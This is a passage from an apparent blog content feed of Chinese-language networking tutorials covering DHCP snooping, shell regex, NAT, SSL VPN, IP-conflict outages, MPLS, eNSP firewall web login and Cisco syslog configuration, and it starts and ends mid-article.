&#123; vlan-id1 [ to vlan-id2 ] &#125; &amp;&lt;1-10&gt;</code>，配置设备允许学习的DHCP Snooping绑定表项的最大个数。<br>执行该命令后，设备所有的接口允许学习的DHCP Snooping绑定表项之和为该命令所配置的值。</p><p>在VLAN或者接口视图下：<br>执行命令<code>dhcp snooping max-user-number max-number</code>，配置接口允许学习的DHCP Snooping绑定表项的最大个数。<br>若在VLAN视图下执行该命令，则VLAN内所有的接口接入的用户最大数为该命令所配置的值。</p><h3 id="5-仿冒DHCP服务器攻击"><a href="#5-仿冒DHCP服务器攻击" class="headerlink" title="5.仿冒DHCP服务器攻击"></a>5.仿冒DHCP服务器攻击</h3><p>此功能需要配置DHCP 信任功能来实现：</p><p>配置接口信任状态</p><p>背景信息</p><p>如图所示场景中，为使DHCP客户端能通过合法的DHCP服务器获取IP地址，需将与管理员信任的DHCP服务器直接或间接连接的设备接口设置为信任接口（如图中的if0），其他接口设置为非信任接口（如图中的if2）。从而保证DHCP客户端只能从合法的DHCP服务器获取IP地址，私自架设的DHCP Server仿冒者无法为DHCP客户端分配IP地址。<br>在连接用户的接口或VLAN下使能DHCP Snooping功能之后，需将连接DHCP服务器的接口配置为“信任”模式，两者同时生效设备即能够生成DHCP Snooping动态绑定表。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/4ef43484a87efac7e716902c2de562fa.png" alt="4ef43484a87efac7e716902c2de562fa.png"></p><p><strong>解决办法：</strong><br>请在二层网络中的接入设备上执行以下步骤。<br>配置接口为“信任”状态，可在接口视图或VLAN视图下执行。<br>接口视图下：<br>执行命令<code>interface interface-type interface-number</code>，进入接口视图。<br>执行命令<code>dhcp snooping trusted</code>，配置接口为“信任”接口。<br>缺省情况下，接口的状态为“非信任”状态。<br>VLAN视图下：<br>执行命令<code>vlan vlan-id</code>，进入VLAN视图。<br>执行命令<code>dhcp snooping trusted interface interface-type interface-number</code> ，配置接口为“信任”接口。<br>缺省情况下，接口的状态为“非信任”状态。<br>在VLAN视图下执行此命令，则命令功能仅对加入该VLAN的接口收到的属于此VLAN的DHCP报文生效；在接口下执行该命令，则命令功能对该接口接收到的所有DHCP报文生效。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> DHCP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP snooping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell中正则表达式总结</title>
      <link href="2018/06/13/shell-regex/"/>
      <url>2018/06/13/shell-regex/</url>
      
        <content type="html"><![CDATA[<p>shell正则表达式分为基础正则表达式和扩展正则表达式。shell的正则表达式可以用在很多地方用来匹配我们需要的结果，例如可以用在gerp命令后面。</p><h2 id="shell基础正则表达式："><a href="#shell基础正则表达式：" class="headerlink" title="shell基础正则表达式："></a>shell基础正则表达式：</h2><ul><li>字符匹配：</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">. 任意单个字符[ ] 指定范围内的任意单个字符[ 0,9 ]  , [ [:digit: ]][a,z ] , [[ :lower:]][A,Z] , [[:upper:]][[:alpha:]]  匹配任意英文字母[[:alnum:&#96;&#96;]]  匹配任意英文字母和数字[[:space:]]  匹配空格[[:punct:]]  匹配任意特殊字符[^]  匹配指定范围内的任意单个字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>次数匹配：用户匹配其前面的字符的次数</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">*  匹配前面字符任意次.* 匹配任意字符的任何次数\? 匹配前面字符0次或者1次\&#123;m\&#125;  匹配前面字符m次\&#123;m,n\&#125; 匹配前面字符至少m次至多n次\&#123;m,\&#125;  匹配前面字符至少m次\&#123;0,m\&#125; 匹配前面的字符至多m次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>位置锚定：用于指定字符出现的位置</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">^ 锚定行首$ 锚定行尾^$ 空白行\&lt; 锚定词首\&gt; 锚定词尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>分组</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">\(\)  例如 \(ab\) * xy 匹配ab任意次数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>引用</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">\1  反向引用，引用前面的第一个左括号以及与之对应的右括号中的模式所匹配到的内容\2  引用前面的第二个左括号以及与之对应的右括号中的模式所匹配到的内容例如：\(a.b\)xy\1  可以匹配到：a6bxya6b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="扩展正则表达式"><a href="#扩展正则表达式" class="headerlink" title="扩展正则表达式"></a>扩展正则表达式</h2><p>扩展正则表达式是在基础正则表达式的基础上有所增加和改动，大部分都和基础正则表达式相同。</p><p><strong>改动内容</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">次数匹配：*：匹配其前面的字符任意次；?: 匹配其前面的字符0或1次；+: 匹配其前面的字符至少1次&#123;m&#125;: 匹配其前面的字符m次；&#123;m,n&#125;: 至少m次，至多n次&#123;m,&#125;: 至少m次；&#123;0,n&#125;：至多n次；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>分组：</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">()  括号直接可以分组| 或者grep -E &quot;con(C|c)at&quot; 表示 conCat或concat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>本文完。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT server和目的NAT</title>
      <link href="2018/06/13/NATserver-DNAT/"/>
      <url>2018/06/13/NATserver-DNAT/</url>
      
        <content type="html"><![CDATA[<p>NAT可以分为两大类：</p><p>1.基于源IP地址的NAT<br>2.基于目的IP地址的NAT</p><p>按照功能不同，基于目的IP地址的NAT server和目的NAT：<br><strong>NAT Server</strong>：主要应用于实现私网服务器以公网IP地址对外提供服务的场景。<br><strong>目的NAT</strong>：主要应用于实现手机用户上网时，手机的缺省WAP网关与所在地运营商的实际WAP网关不一致，导致需要修改报文的目的网关地址的场景</p><h2 id="NAT-server"><a href="#NAT-server" class="headerlink" title="NAT server"></a>NAT server</h2><p><strong>NAT Server是最常用的基于目的地址的NAT</strong> 。当内网部署了一台服务器，其真实IP是私网地址，但是希望公网用户可以通过一个公网地址来访问该服务器，这时可以配置NAT Server，使设备将公网用户访问该公网地址的报文自动转发给内网服务器。</p><p>NAT Server功能使得内部服务器可以供外部网络访问。外部网络的用户访问内部服务器时，NAT将请求报文的目的地址转换成内部服务器的私有地址。对内部服务器回应报文而言，NAT还会自动将回应报文的源地址（私网地址）转换成公网地址。</p><p>NAT Server可以通过静态IP（即global IP地址）和动态IP（即接口IP地址）两种方式实现地址转换。当通过global IP地址配置NAT Server后，再通过基于接口地址的方式配置NAT Server，当被借用的接口的地址与global IP地址相同时，二者冲突，基于接口方式的NAT Server不生效。</p><h2 id="目的NAT"><a href="#目的NAT" class="headerlink" title="目的NAT"></a>目的NAT</h2><p>在移动终端访问无线网络时，如果其缺省WAP网关地址与所在地运营商的WAP网关地址不一致时，可以在终端与WAP网关中间部署一台设备，并配置目的NAT功能，使设备自动将终端发往错误WAP网关地址的报文自动转发给正确的WAP网关</p><p>手机用户需要通过登录WAP（Wireless Application Protocol）网关来实现上网的功能。目前，大量用户使用直接从国外购买的手机，这些手机出厂时，缺省设置的WAP网关地址与本国WAP网关地址不符，且无法自行修改，从而导致用户不能移动上网。</p><p>为解决这一问题，无线网络中，在WAP网关与用户之间部署USG。通过在设备上配置目的NAT功能，使这部分手机用户能够正常获取网络资源。</p><blockquote><p>目的NAT用的比较少，大致了解下就可以了。</p></blockquote><p>更多详细信息和配置请参考：<br><a href="http://support.huawei.com/hedex/hdx.do?docid=EDOC1000038797&lang=zh">http://support.huawei.com/hedex/hdx.do?docid=EDOC1000038797&amp;lang=zh</a><br>有关NAT SERVER和目的NAT的说明。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> NAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NATserver </tag>
            
            <tag> 目的NAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssl vpn</title>
      <link href="2018/06/08/SSL-VPN/"/>
      <url>2018/06/08/SSL-VPN/</url>
      
        <content type="html"><![CDATA[<h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>之前介绍的IPSEC VPN,L2TP VPN,MPLS VPN等属于二层或者三成VPN。而SSL VPN则属于应用层面的vpn,SSL VPN是以SSL协议为安全基础的VPN远程接入技术，移动办公人员（在SSL VPN中被称为远程用户）使用SSL VPN可以安全、方便的接入企业内网，访问企业内网资源，提高工作效率。</p><p><strong>在SSL VPN出现之前，IPSec、L2TP等先期出现的VPN技术虽然可以支持远程接入这个应用场景，但这些VPN技术存在如下缺陷。</strong></p><ul><li>远程用户终端上需要安装指定的客户端软件，导致网络部署、维护比较麻烦。</li><li>IPSec/L2TP VPN的配置繁琐。</li><li>网络管理人员无法对远程用户访问企业内网资源的权限做精细化控制。</li></ul><p><strong>SSL VPN凭借自身的技术特点使其在远程接入应用场景中与早期VPN相比更具优势，其特点如下：</strong></p><ul><li>SSL VPN采用B/S架构设计，远程用户终端上无需安装额外的客户端软件，直接使用Web浏览器就可以安全、快捷的访问企业内网资源。</li><li>可以根据远程用户访问内网资源类型的不同，对其访问权限进行高细粒度控制。</li><li>提供了本地认证、服务器认证、证书匿名和证书挑战多种身份认证方式，提高了身份认证的灵活性。</li><li>主机检查策略可以检查远程用户终端的操作系统、端口、进程以及杀毒软件等是否符合安全要求，并且还具备防跳转、防截屏的能力，消除了潜藏在远程用户终端上的安全隐患。</li><li>缓存清理策略用于清理远程用户访问内网过程中在终端上留下的访问痕迹，加固了用户的信息安全。</li></ul><h3 id="SSL-VPN业务分类："><a href="#SSL-VPN业务分类：" class="headerlink" title="SSL VPN业务分类："></a>SSL VPN业务分类：</h3><p>根据远程用户访问内网资源类型的不同，SSL VPN提供了Web代理、文件共享、端口转发、网络扩展这四种内网访问方式，即SSL VPN业务。</p><table><thead><tr><th>业务</th><th>定义</th></tr></thead><tbody><tr><td>Web代理</td><td>远程用户访问内网Web资源时使用Web代理业务。</td></tr><tr><td>文件共享</td><td>远程用户访问内网文件服务器（如支持SMB协议的Windows系统、支持NFS协议的Linux系统）时使用文件共享业务。远程用户直接通过Web浏览器就能在内网文件系统上创建和浏览目录，进行下载、上传、改名、删除等文件操作，就像对本机文件系统进行操作一样方便。</td></tr><tr><td>端口转发</td><td>远程用户访问内网TCP资源时使用端口转发业务。适用于TCP的应用服务包括Telnet、远程桌面、FTP、Email等。端口转发提供了一种端口级的安全访问内网资源的方式。</td></tr><tr><td>网络扩展</td><td>远程用户访问内网IP资源时使用网络扩展业务。Web资源、文件资源以及TCP资源都属于IP资源，通常在不区分用户访问的资源类型时为对应用户开通此业务。</td></tr></tbody></table><h3 id="虚拟网关："><a href="#虚拟网关：" class="headerlink" title="虚拟网关："></a>虚拟网关：</h3><p>FW向远程用户提供SSL VPN接入服务的功能模块称为虚拟网关，虚拟网关有独立的IP地址。网络管理员可以在虚拟网关下配置用户、资源以及用户访问资源的权限等。</p><p>通常大中型企业会有多个业务部门，每个业务部门都有自己的内部资源和授权策略，这些业务层面的需求将致使FW的SSL VPN配置管理变的复杂。通过在FW上创建多个虚拟网关，每个业务部门独立使用自己的虚拟网关对外提供SSL VPN接入服务，使得业务管理更加清晰和简单。</p><p>如图所示，在FW上创建研发、财务和营销三个虚拟网关，不同部门的外出办公人员通过访问各自业务部门的虚拟网关，就可以获取该业务部门下的资源。</p><p><img src="https://i.loli.net/2018/03/08/5aa0b228de43d.png" alt="sec_admin_ssl_0001_fig02.png"></p><h3 id="总体流程："><a href="#总体流程：" class="headerlink" title="总体流程："></a>总体流程：</h3><p>SSL vpn根据业务种类的不同，原理也不尽相同，这里就不详细介绍各个业务的原理了，有兴趣的可以自行百度。 SSL vpn的配置非常简单，在WEB页面上点点鼠标即可，所以也不介绍了。</p><p>远程用户通过SSL VPN访问企业内网资源的总体流程如图所示。</p><p><img src="https://i.loli.net/2018/03/08/5aa0b48967084.png" alt="sec_admin_ssl_0004_fig01.png"></p><p>FW向远程用户提供SSL VPN接入服务的功能模块称为虚拟网关，虚拟网关是远程用户访问企业内网资源的统一入口。远程用户在Web浏览器中输入虚拟网关的IP地址，并在虚拟网关登录界面输入用户名和密码，虚拟网关将会对用户进行身份认证。身份认证通过后，虚拟网关会向远程用户提供可访问的内网资源列表，远程用户点击资源列表链接即可访问对应资源。远程用户在资源访问列表中只能看到网络管理员为其开通的业务资源，例如为远程用户A开通了Web代理业务，则远程用户A在资源列表中就只能看到有权访问的Web资源，而看不到企业内网中的文件资源、TCP资源等其他资源。</p><p>一台FW设备可以创建多个虚拟网关，每个虚拟网关之间相互独立，互不影响。可以在虚拟网关下配置各自的用户、资源和策略，进行单独管理。虚拟网关本身无独立的管理员，所有虚拟网关的创建、配置、修改和删除等管理操作统一由FW的系统管理员完成。</p><p><strong>用户登录</strong><br>远程用户通过Web浏览器（客户端）登录虚拟网关，请求建立SSL连接。虚拟网关向远程用户发送自己的本地证书，远程用户对虚拟网关的本地证书进行身份认证。认证通过后，远程用户与虚拟网关成功建立SSL连接。</p><p><strong>用户认证</strong><br>虚拟网关对远程用户进行用户认证，验证用户身份。用户认证可以选择以下四种方式之一：本地认证、服务器认证、证书匿名认证、证书挑战认证。</p><p><strong>角色授权</strong><br>用户认证完成后，虚拟网关查询该用户的资源访问权限。用户的权限分配通过角色实现，先将具有相同权限的用户/组加入某个角色，然后角色关联可访问的业务资源，角色是联系用户和资源的纽带。</p><p><strong>资源访问</strong><br>虚拟网关根据远程用户的角色信息，向用户推送可访问的资源链接，远程用户点击对应的资源链接进行资源访问。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sslvpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址冲突导致的用户断网</title>
      <link href="2018/04/21/IP-conflict-network-outage/"/>
      <url>2018/04/21/IP-conflict-network-outage/</url>
      
        <content type="html"><![CDATA[<p>当用户通过交换机接入网络与网关（路由器）进行通信，如下图：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/f359394be4a5cb1b5067d9292139f161.png" alt="f359394be4a5cb1b5067d9292139f161.png"></p><p>当PC1正常上网，另外一个用户PC2仿冒PC1的IP地址接入网络，此时会出现什么情况呢？</p><ul><li>仿冒者可以正常上网</li><li>正常用户被踢下线</li></ul><p><strong>原因分析:</strong></p><p>当PC2仿冒PC1的ip地址接入网络，PC2要访问网管时，会向网络中广播发送ARP报文寻找网关的MAC地址。PC1和网关都会收到此报文，pc1不予理会因为目标IP不是我，不是请求我的IP地址的。网关会正常回应PC2自己的MAC地址。<br>但网络中的主机会收到关于IP地址冲突的报文.</p><p>PC2获取到了网关的MAC地址可以访问网关，此时问题出现了，原来的PC1也正在访问网关，但网关回报时把数据包回给了PC2。因为PC1和PC2的ip地址一样，PC2后请求的网关的MAC地址，网关就回把数据包回给PC2，<strong>此时就回导致PC1访问网关的数据中断，造成客户异常下线。</strong></p><blockquote><p>实验证明：谁是最后请求的网关的MAC地址，网关回包时就会包数据包给谁，造成另一方用户下线。感兴趣的同学可以做个实验试一下</p></blockquote><p>基于这种情况的发生，我们需要在交换机上配置DAI和IPSG，避免非法用户的接入以及非法ARP报文的请求。</p><p>DAI请参考下面这篇文章：<br><a href="https://www.zybuluo.com/handbye/note/780400">https://www.zybuluo.com/handbye/note/780400</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DAI </tag>
            
            <tag> ip冲突 </tag>
            
            <tag> IPSG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MPLS基础总结</title>
      <link href="2018/03/23/MPLS-summary/"/>
      <url>2018/03/23/MPLS-summary/</url>
      
        <content type="html"><![CDATA[<h3 id="出现背景："><a href="#出现背景：" class="headerlink" title="出现背景："></a>出现背景：</h3><p>MPLS(Multiprotocol Label Switching)多协议标签交换，mpls的出现主要是因为上世纪90年代传统ip路由转发出现瓶颈，MPLS最初是为了提高路由器的转发速度而提出的。与传统IP路由方式相比，它在数据转发时，只在网络边缘分析IP报文头，而不用在每一跳都分析IP报文头，节约了处理时间，所以才想到了使用标签转发来替代传统的ip查表转发。但是随着硬件工艺的发展，逐渐出现的硬件转发和芯片转发，之前ip转发查表慢的问题已经不复存在。</p><p>由于mpls标签转发的思想在mpls vpn和mpls TE（流量工程）方面的应用也使得这一技术得以存在并且大放异彩，MPLS vpn在企业网和运营商中运用的都比较多，MPLS TE主要在运营商中应用。本篇先介绍MPLS，mpls vpn随后介绍。</p><h3 id="相关概念："><a href="#相关概念：" class="headerlink" title="相关概念："></a>相关概念：</h3><p><img src="https://i.loli.net/2018/01/23/5a670651b5142.png" alt="fig_dc_fd_mpls_000403.png"><br>mpls域：由mpls协议转发数据的区域。<br>LSR：Label Switching Router，标签交换路由器，在mpls域中负载标签交换操作的路由器。</p><p>LER：Label Edge Router，标签边缘路由器，在mpls域的边缘负责标签的压人或者弹出，连接其它网络的路由器。</p><p>LSP:Label Switched Path，标签转发路径，IP报文在MPLS网络中经过的路径，LSP是一个单向路径，与数据流的方向一致。</p><p>LSP的入口LER称为入节点（Ingress）；位于LSP中间的LSR称为中间节点（Transit）；LSP的出口LER称为出节点（Egress）。一条LSP可以有0个、1个或多个中间节点，但有且只有一个入节点和一个出节点。</p><p>根据LSP的方向，MPLS报文由Ingress发往Egress，则Ingress是Transit的上游节点，Transit是Ingress的下游节点。同理，Transit是Egress上游节点，Egress是Transit的下游节点。</p><h3 id="体系结构："><a href="#体系结构：" class="headerlink" title="体系结构："></a>体系结构：</h3><p>mpls的体系结构如图所示，mpls把控制平面和转发平面分开，控制平面负载计算路由，转发平面负责利用FIB表转发数据。这种控转分离的思想十分重要，现在的SDN也正是应用了这种思想。<br><img src="https://i.loli.net/2018/01/23/5a670651323ff.png" alt="fig_dc_fd_mpls_000402.png"></p><p><strong>控制平面：负责产生和维护路由信息以及标签信息。</strong></p><ol><li>路由信息表RIB（Routing Information Base）：由IP路由协议（IP Routing<br>Protocol）生成，用于选择路由。</li><li>标签分发协议LDP（Label Distribution<br>Protocol）：负责标签的分配、标签转发信息表的建立、标签交换路径的建立、拆除等工作。</li><li>标签信息表LIB（Label Information Base）：由标签分发协议生成，用于管理标签信息。</li></ol><p><strong>转发平面：即数据平面（Data Plane），负责普通IP报文的转发以及带MPLS标签报文的转发。</strong></p><ol><li><p>转发信息表FIB（Forwarding Information Base）：从RIB提取必要的路由信息生成，负责普通IP报文的转发。</p></li><li><p>标签转发信息表LFIB（Label Forwarding Information<br>Base）：简称标签转发表，由标签分发协议在LSR上建立LFIB，负责带MPLS标签报文的转发。</p></li></ol><h3 id="mpls标签结构："><a href="#mpls标签结构：" class="headerlink" title="mpls标签结构："></a>mpls标签结构：</h3><p><img src="https://i.loli.net/2018/01/23/5a67065174ca8.png" alt="fig_dc_fd_mpls_000501.png"></p><p>标签结构如上图，mpls中最重要的东西就是标签，标签的建立直接关系着报文的转发。mpls会为一个转发等价类分配相同的标签。</p><blockquote><p>转发等价类：mpls将以相同方式处理的一组报文分为一个转发等价类，转发等价类的区分方式可以是路由，也可以是其他东西。但是目前用到的都是以路由来区分的，即将到达同一目路由的所有报文都会打上相同的标签。</p></blockquote><p><strong>标签栈：</strong><br>标签栈即mpls的标签可以有多层，但是一般只用到二层或者三层。这里先提一下，在随后介绍到的mpls vpn中还会用到。<br><img src="https://i.loli.net/2018/01/23/5a67079fa0d8f.png" alt="fig_dc_fd_mpls_000502.png"></p><p><strong>标签空间</strong><br>标签空间就是指标签的取值范围。标签空间划分如下：</p><p>0～15：特殊标签。</p><p>16～1023：静态LSP和静态CR-LSP（Constraint-based Routed Label Switched Path）共享的标签空间。</p><p>1024及以上：LDP、RSVP-TE（Resource Reservation Protocol-Traffic Engineering）、MP-BGP（MultiProtocol Border Gateway Protocol）等动态信令协议的标签空间。</p><h3 id="mpls的转发："><a href="#mpls的转发：" class="headerlink" title="mpls的转发："></a>mpls的转发：</h3><p>mpls的转发依赖ip网络的连通性，因为需要为ip网络中路由来分配标签后按照标签来转发报文。</p><p>为不同的路由分配不同的标签后，就会为一个转发等价类（FEC）建立起一条LSP。建立LSP或者说分配标签的方式有两种：</p><p>静态建立LSP，即手动为不同的FEC分配不同的标签。</p><p>动态建立LSP，使用LDP，MP-BGP等协议来划分FEC和分配标签。</p><p><strong>动态LSP的基本建立过程</strong></p><p>标签由下游LSR分配，按从下游到上游的方向分发。如下图，由下游LSR在IP路由表的基础上进行FEC的划分，并根据FEC分配标签，通告给上游的LSR，以便建立标签转发表和LSP。</p><p><img src="https://i.loli.net/2018/01/23/5a6744499636a.jpg" alt="enter description here" title="fig_dc_fd_mpls_000602"></p><p>当标签分配完成，LSP确定之后，就开始了数据包的在mpls和ip网络中的传递。这时候就会涉及到标签的转发方式。</p><p><strong>标签操作类型包括标签压入（Push）、标签交换（Swap）和标签弹出（Pop），它们是标签转发的基本动作。</strong></p><ul><li>Push：当IP报文进入MPLS域时，MPLS边界设备在报文二层首部和IP首部之间插入一个新标签；或者MPLS中间设备根据需要，在标签栈顶增加一个新的标签（即标签嵌套封装）。</li><li>Swap：当报文在MPLS域内转发时，根据标签转发表，用下一跳分配的标签，替换MPLS报文的栈顶标签。</li><li>Pop：当报文离开MPLS域时，将MPLS报文的标签剥掉。</li></ul><p>在最后一跳节点，标签已经没有使用价值。这种情况下，可以利用倒数第二跳弹出特性PHP（Penultimate Hop Popping），在倒数第二跳节点处将标签弹出，减少最后一跳的负担。最后一跳节点直接进行IP转发或者下一层标签转发。<br>默认情况下，设备支持PHP特性，支持PHP的Egress节点分配给倒数第二跳节点的标签值为3。标签操作类型包括标签压入（Push）、标签交换（Swap）和标签弹出（Pop），它们是标签转发的基本动作。</p><p><em>详细转发过程这里就不写了，请参考产品文档。</em></p><h3 id="MPLS对TTL的处理："><a href="#MPLS对TTL的处理：" class="headerlink" title="MPLS对TTL的处理："></a>MPLS对TTL的处理：</h3><p>mpls也可以使用TTL来防环，mpls对TTL的处理方法分为两种：</p><p>MPLS标签中包含一个8比特的TTL字段，其含义与IP头中的TTL域相同。MPLS对TTL的处理除了用于防止产生路由环路外，也用于实现Traceroute功能。</p><p>RFC3443中定义了两种MPLS对TTL的处理模式：Uniform和Pipe。缺省情况下，MPLS对TTL的处理模式为Uniform。</p><p><strong>Uniform模式</strong><br>IP报文经过MPLS网络时，在入节点，IP TTL减1映射到MPLS TTL字段，此后报文在MPLS网络中按照标准的TTL处理方式处理。在出节点将MPLS TTL减1后映射到IP TTL字段。</p><p><strong>Pipe模式</strong><br>在入节点，IP TTL值减1，MPLS TTL字段为固定值，此后报文在MPLS网络中按照标准的TTL处理方式处理。在出节点会将IP TTL字段的值减1。即IP分组经过MPLS网络时，无论经过多少跳，IP TTL只在入节点和出节点分别减1。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> MPLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mpls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用web登陆esnp模拟器上的USG6000V防火墙</title>
      <link href="2018/03/15/web-login-esnp-USG6000V/"/>
      <url>2018/03/15/web-login-esnp-USG6000V/</url>
      
        <content type="html"><![CDATA[<p>华为的USG系列防火墙默认是开启了web登陆的，我们可以使用浏览器登陆到防火墙中对其进行一些配置。如果没有真实设备，但又想体现下使用web管理防火墙怎么办呢？<br>别担心，华为的ENSP模拟上的USG6000V防火墙也是就可以用浏览器来登录管理的，下面就介绍下怎么来登录。</p><h3 id="打开ensp，并打开一台防火墙，然后打开一个cloud"><a href="#打开ensp，并打开一台防火墙，然后打开一个cloud" class="headerlink" title="打开ensp，并打开一台防火墙，然后打开一个cloud"></a>打开ensp，并打开一台防火墙，然后打开一个cloud</h3><p>拓扑连接如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/d220e8527a0efc62cbeb08d6c5bb46c1-373x196.png" alt="d220e8527a0efc62cbeb08d6c5bb46c1-373x196.png"></p><p>cloud的配置如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/5d893d4041be0240a359d76f57966bd9-768x521.png" alt="5d893d4041be0240a359d76f57966bd9-768x521.png"></p><blockquote><p>关于如何使用cloud桥接本地网卡的说明参考：<a href="http://www.cnblogs.com/handbye/p/7709427.html">点击这里查看</a></p></blockquote><p><strong>保证电脑可以ping通防火墙的G0/0/0接口，华为USG防火墙的默认管理接口为G0/0/0，默认管理地址为：192.168.0.1</strong></p><p>管理接口的默认配置如下：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface GigabitEthernet0&#x2F;0&#x2F;0 undo shutdown ip binding vpn-instance default ip address 192.168.0.1 255.255.255.0 service-manage http permit service-manage https permit service-manage ping permit service-manage ssh permit service-manage snmp permit service-manage telnet permit service-manage netconf permit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我的电脑本地连接5地址为：192.168.0.100</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/143fd5f1e023f12be430f80aa9233118-373x110.png" alt="143fd5f1e023f12be430f80aa9233118-373x110.png"></p><p>我是可以ping通192.168.0.1的。</p><h3 id="打开浏览器，输入：https-192-168-0-1-8443-即可打开防火墙登陆界面。"><a href="#打开浏览器，输入：https-192-168-0-1-8443-即可打开防火墙登陆界面。" class="headerlink" title="打开浏览器，输入：https://192.168.0.1:8443/ 即可打开防火墙登陆界面。"></a>打开浏览器，输入：<a href="https://192.168.0.1:8443/">https://192.168.0.1:8443/</a> 即可打开防火墙登陆界面。</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/73f3acdc4df7e00aa603741015429005-768x397.png" alt="73f3acdc4df7e00aa603741015429005-768x397.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 防火墙 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ensp </tag>
            
            <tag> USG6000V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco的一些管理协议</title>
      <link href="2017/09/13/cisco-management-protocol/"/>
      <url>2017/09/13/cisco-management-protocol/</url>
      
        <content type="html"><![CDATA[<h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h2><p>syslog 是日志服务功能。<br>在思科的路由器上是默认打开的</p><pre class="line-numbers language-none"><code class="language-none">logging on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但console下的syslog功能是默认关闭的。<br>打开命令：<code>logging console</code></p><p>syslog有七个级别：</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134636756-1108858121.png"></p><blockquote><p>每个日志消息被关联一个严重级别，用来分类消息的严重等级：数字越低，消息越严重。严重级别的范围从0（最高）到7（最低）。使用logging命令可以用数字或者名称来指定严重性。</p></blockquote><p>基本配置如下：</p><pre class="line-numbers language-none"><code class="language-none">logging on  &#x2F;&#x2F;打开路由器logging功能。默认是打开的logging trap 7  &#x2F;&#x2F;设置路由器向syslog服务器发送trap消息的级别（也可以直接敲logging trap,默认级别为 6）logging 10.1.1.1 &#x2F;&#x2F;设置syslog服务器logging bufferd 7  &#x2F;&#x2F;将log信息缓存到buffer里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>show logging看到的部分信息如下：</p><pre class="line-numbers language-none"><code class="language-none">Inside#show loggingSyslog logging: enabled (0 messages dropped, 3 messages rate-limited, 0 flushes, 0 overruns, xml disabled, filtering disabled)No Active Message Discriminator.No Inactive Message Discriminator.    Console logging: level debugging, 63 messages logged, xml disabled,                     filtering disabled    Monitor logging: level debugging, 0 messages logged, xml disabled,                     filtering disabled    Buffer logging:  level debugging, 65 messages logged, xml disabled,                    filtering disabled    Exception Logging: size (4096 bytes)    Count and timestamp logging messages: disabled    Persistent logging: disabledNo active filter modules.    Trap logging: level debugging, 66 message lines logged        Logging to 10.1.1.100  (udp port 514, audit disabled,              link up),              19 message lines logged,              0 message lines rate-limited,              0 message lines dropped-by-MD,              xml disabled, sequence number disabled              filtering disabled        Logging Source-Interface:       VRF Name:Log Buffer (4096 bytes):figuration file cdrom1:&#x2F;ovf-env.xml is ignored: checksum unchanged since last inspected*Sep 23 10:04:06.400: %SYS-5-CONFIG_I: Configured from memory by console*Sep 23 10:04:06.413: %IOSXE_OIR-6-INSCARD: Card (rp) inserted in slot R1*Sep 23 10:04:06.413: %IOSXE_OIR-6-INSCARD: Card (fp) inserted in slot F0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在syslog服务器上也可以看到log信息：</p><p><img 